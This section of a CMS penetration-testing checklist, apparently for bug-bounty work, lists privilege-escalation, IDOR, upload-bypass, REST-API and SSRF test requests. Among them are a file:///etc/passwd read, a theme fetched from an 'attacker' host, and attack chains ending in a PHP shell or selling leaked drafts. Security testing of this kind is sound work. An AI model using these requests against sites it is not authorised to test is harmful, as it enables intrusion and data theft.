## 8. CMS / CONTENT MANAGEMENT

### Signature Assets
- Content, pages, posts, articles
- User accounts, authors, editors
- Media files, uploads
- Plugin/extension configs
- Themes, design files
- Multi-site networks

### Critical Roles
| Role | Key Permission | Test Point |
|------|---------------|------------|
| Author | Create own content | PE to Editor/Admin |
| Editor | Edit any content | IDOR on drafts |
| Admin | Full system | RCE via upload |
| Super Admin | Multi-site | Cross-site access |

### Priority Attack Surface

```
1. PRIVILEGE ESCALATION ← MOST CRITICAL
   PUT  /api/users/{id}/role              → mass assign admin role
   POST /api/users/{id}/capabilities      → add capabilities
   GET  /api/users/me                     → modify response role field
   Test: Author → Editor → Admin in one request

2. IDOR ON DRAFTS / POSTS
   GET  /api/posts/{id}                   → sequential post IDs
   GET  /api/posts?status=draft           → list all drafts
   GET  /api/posts/{id}/revisions         → access revision history
   Test: Guest accesses unpublished content

3. MEDIA UPLOAD BYPASS
   POST /api/media/upload                 → upload .php, .phtml, .shtml
   POST /api/media/upload                 → upload .svg with XSS
   POST /api/media/upload                 → double extension (.php.jpg)
   POST /api/media/upload                 → content-type manipulation
   Test: all 10 file upload bypass techniques

4. REST API AUTH BYPASS
   GET  /wp-json/wp/v2/users              → user enumeration
   GET  /wp-json/wp/v2/posts              → list all (including drafts)
   POST /wp-json/wp/v2/users/{id}         → modify user without auth
   Test: WordPress REST API without nonce

5. SSRF VIA MEDIA / IMPORT
   POST /api/media/import?url=http://internal   → SSRF
   POST /api/media/import?url=file:///etc/passwd → LFI
   POST /api/themes/install?source=http://attacker
   Test: all URL-based import features
```

### Top Attack Chains
```
1. [Critical] Author → Admin PE → Install Malicious Plugin → RCE → Full Server
2. [High]      REST API IDOR → Read All Drafts → Leak Unpublished Content → Sell
3. [Critical]  Media Upload Bypass → Upload PHP Shell → RCE → Database Dump
4. [High]      Media SSRF → Scan Internal Network → Find Database → Access
5. [Medium]    Multi-Site IDOR → Access All Sites' Content → Mass Extraction
```

### Real H1 Examples
- WordPress: Privilege escalation (#13959)
- WordPress: REST API user enumeration (well-known)
- WordPress: File upload bypass (10+ techniques documented)

---

